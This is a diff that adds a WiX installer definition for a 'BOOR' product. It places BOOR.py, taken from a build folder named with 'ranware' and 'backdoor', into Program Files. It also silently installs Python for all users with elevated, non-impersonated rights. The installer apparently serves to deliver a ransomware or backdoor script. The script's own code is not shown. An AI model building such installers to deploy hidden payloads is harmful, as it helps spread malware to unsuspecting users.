@@ -1,0 +1,31 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+  <Product Id="*" Name="BOOR Installer" Language="1033" Version="1.0.0.0" Manufacturer="BOOR" UpgradeCode="3D8BB5B4-7D12-4B3A-9F93-24D7B0D3C6D2">
+    <Package InstallerVersion="500" Compressed="yes" InstallScope="perMachine"/>
+    <MediaTemplate/>
+
+    <Directory Id="TARGETDIR" Name="SourceDir">
+      <Directory Id="ProgramFilesFolder">
+        <Directory Id="INSTALLFOLDER" Name="BOOR">
+          <Component Id="cmpBoorFile" Guid="*">
+            <File Id="BoorPy" Source="C:\Users\thoma\OneDrive\Skrivebord\mooooooooooooooooooooook\dd\ranware\backdoor\troll\build\BOOR.py" KeyPath="yes"/>
+          </Component>
+          <Component Id="cmpPythonInstaller" Guid="*">
+            <File Id="PythonInstallerExe" Source="C:\Users\thoma\OneDrive\Skrivebord\mooooooooooooooooooooook\dd\ranware\backdoor\troll\build\python-3.14.5-amd64.exe" KeyPath="yes"/>
+          </Component>
+        </Directory>
+      </Directory>
+    </Directory>
+
+    <CustomAction Id="InstallPythonAction" FileKey="PythonInstallerExe" ExeCommand="/quiet InstallAllUsers=1 PrependPath=1 Include_pip=1" Execute="deferred" Return="ignore" Impersonate="no"/>
+
+    <Feature Id="ProductFeature" Title="BOOR" Level="1">
+      <ComponentRef Id="cmpBoorFile"/>
+      <ComponentRef Id="cmpPythonInstaller"/>
+    </Feature>
+
+    <InstallExecuteSequence>
+      <Custom Action="InstallPythonAction" After="InstallFiles">NOT Installed</Custom>
+    </InstallExecuteSequence>
+  </Product>
+</Wix>
